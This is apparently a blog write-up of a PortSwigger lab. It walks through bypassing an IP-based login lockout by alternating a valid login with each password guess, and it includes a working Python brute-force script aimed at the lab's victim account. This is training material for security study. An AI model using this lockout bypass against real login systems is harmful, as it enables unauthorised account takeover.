+++
title = "Authentication Vulnerabilities: Lab 4: Broken brute-force protection, IP block"
date = 2025-11-06
lastmod = 2025-11-06
draft = false
author = "bloodstiller"
description = "PortSwigger authentication lab write-up exploring how to bypass bruteforcing ip limitations using legitmate account logins concurrently"
tags = [
  "WebSecurity",
  "PortSwigger",
  "web-exploitation",
  "security-research",
  "authentication",
  "login",
  "username-enumeration",
  "timing-attack",
  "response-timing",
  "side-channel",
  "portswigger-labs",
  "ctf-writeup",
  "python"
]
keywords = [
  "authentication vulnerabilities",
  "username enumeration via timing",
  "timing attacks",
  "response time side channel",
  "PortSwigger authentication lab",
  "web security",
  "login brute force",
  "side-channel analysis"
]
toc = true
bold = true
next = true
+++

## Lab 4: Broken brute-force protection, IP block: {#lab-4-broken-brute-force-protection-ip-block}

> This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim's password, then log in and access their account page.
>
> Your credentials: wiener:peter
> Victim's username: carlos
> Candidate passwords


### Initial Reconnaissance/Discovery: {#initial-reconnaissance-discovery}

As usual we are given a simple web application which has a "My account" section for us to login.
![](/ox-hugo/2025-11-05_10-06.png)

We will login with our own credentials so we can take a look at the requests.
![](/ox-hugo/2025-11-05_10-11.png)

Looking at the request there is nothing out of the ordinary regarding it.
![](/ox-hugo/2025-11-05_10-12.png)


### Trying to bruteforce Carlos' password: {#trying-to-bruteforce-carlos-password}

So let's see what happens if we just try and bruteforce the password&#x2026;here's a hint, it won't work&#x2026;

We send the POST request to repeater and set our injection point as the password field and copy the provided password list to the payloads panel as well as set the username to be "carlos".
![](/ox-hugo/2025-11-05_10-15.png)

As suspected we are rate limited as we get the below response which says "You have made too many incorrect login attempts. Please try again in 1 minute(s)."
![](/ox-hugo/2025-11-05_10-16.png)

Now we have a few options here, we could do this very slowly and actually only send a few requests at a time with large breaks in between or we could do what was suggested in the preceding section.

Re-reading the page prior to the lab we can see the below, which gives a pretty big hint on what we need to do to bypass the restriction's:  

- <https://portswigger.net/web-security/learning-paths/authentication-vulnerabilities/password-based-vulnerabilities/authentication/password-based/flawed-brute-force-protection>

> For example, you might sometimes find that your IP is blocked if you fail to log in too many times. <span class="underline">In some implementations, the counter for the number of failed attempts resets if the IP owner logs in successfully.</span> **This means an attacker would simply have to log in to their own account every few attempts to prevent this limit from ever being reached.**
>
> In this case, **merely including your own login credentials at regular intervals throughout the wordlist is enough to render this defense virtually useless**.

So reading that all we have to do is include our credentials at regular intervals as a means to bypass the restrictions.

Looking at the requests from our first attempt we can see that the restrictions came in on the 3rd invalid attempt, this means we need to have login with our credentials at least every 2nd attempt.

Now there are ways to do with this burp but I am also trying to get more adept at python (I've gotten a little sloppy as of late) so let's code a solution that can do this.


### Scripting A Solution: {#scripting-a-solution}

For the below solution to work it requires that we copy the passwords list into a file called "pass.txt" and also download the burp ca certificate which will enable proxying through burp, you can however remove all the proxy information and it will still work.


#### Prep The Certificate: {#prep-the-certificate}

If you want to proxy traffic through burp this is mandatory.

Open burp's in built web browser and go to <http://burpsuite> &amp; download the certificate by clicking on “CA Certificate” button on the top right corner.
![](/ox-hugo/2025-11-06_05-56.png)

Convert the certificate to the `.pem` format so the python requests module can use it.

```shell
openssl x509 -inform der -in certificate.cer -out certificate.pem
```


#### Write Our Bruteforcer: {#write-our-bruteforcer}

This is relatively simple in terms of what it does however I will still break it down in-case you are unfamiliar with what is going on.

```python
#!/usr/bin/env python3
import requests
import os
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

proxy = 'http://127.0.0.1:8080'
os.environ['HTTP_PROXY'] = proxy
os.environ['HTTPS_PROXY'] = proxy
os.environ['REQUESTS_CA_BUNDLE'] = "certificate.pem"

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
url="https://0a2900920491726381e467b4003700b5.web-security-academy.net/login"

with open("pass.txt", 'r') as passes:
    for line in passes:
        password=(line.rstrip('\n'))

        realRequest=requests.post(url, proxies=proxies, verify=False, data={
           'username': 'wiener',
           'password': 'peter',
        })

        bruteRequest=requests.post(url, proxies=proxies, verify=False, data={
            'username': 'carlos',
            'password': password,
        })
        print(bruteRequest.status_code, password)
```


##### Code Breakdown: {#code-breakdown}

<!--list-separator-->

-  Imports:

    First we import the modules we will need, `requests` &amp; `os`. We also suppress the `requests` warning that will show

    ```python
    import requests
    import os
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
    ```

    If we didn't suppress the warnings the output would look like this.
    ![](/ox-hugo/2025-11-06_06-02.png)

    However with supression the output looks like this.
    ![](/ox-hugo/2025-11-06_06-04.png)

<!--list-separator-->

-  Proxy Setup:

    Now we declare our proxy so we can push all our traffic through burp, we also pass in the converted certificate.

    ```python
    proxy = 'http://127.0.0.1:8080'
    os.environ['HTTP_PROXY'] = proxy
    os.environ['HTTPS_PROXY'] = proxy
    os.environ['REQUESTS_CA_BUNDLE'] = "certificate.pem"
    ```

<!--list-separator-->

-  Variable Declaration:

    We declare an array of proxies to pass to our requests as well as the unique url for our lab's login page as this is where we will be sending requests.

    ```python
    proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
    url="https://0a2900920491726381e467b4003700b5.web-security-academy.net/login"
    ```

<!--list-separator-->

-  Main Logic:

    Our main logic does the following, it opens the `pass.txt` file and reads the contents. We then iterate through the file and take each line &amp; pass it to the variable `password` whilst stripping the new line character from the end of it.

    ```python
    with open("pass.txt", 'r') as passes:
        for line in passes:
            password=(line.rstrip('\n'))
    ```

    We now send a legitimate request the webserver, logging in with our credentials as a means to ensure we are not locked out.

    ```python
            realRequest=requests.post(url, proxies=proxies, verify=False, data={
               'username': 'wiener',
               'password': 'peter',
            })
    ```

    We then send our malicious bruteforce request with the username "carlos" and the password entry from our file being passed by way of the `password` variable. As this happens for every entry we send a legitimate request as well as a malicious request bypassing the restrictions.

    ```python
            bruteRequest=requests.post(url, proxies=proxies, verify=False, data={
                'username': 'carlos',
                'password': password,
            })
    ```

    We print out the response code &amp; password that has been sent. Now this doesn't actually tell us much as all responses are 200, however it's good to just see the progress.

    ```python
            print(bruteRequest.status_code, password)
    ```


#### Checking Burp For Our Results: {#checking-burp-for-our-results}

If we check burp we can see that we have logged in as carlos.
![](/ox-hugo/2025-11-06_06-13.png)

And if we navigate back to the page we can see we have solved the lab.
![](/ox-hugo/2025-11-06_05-46.png)
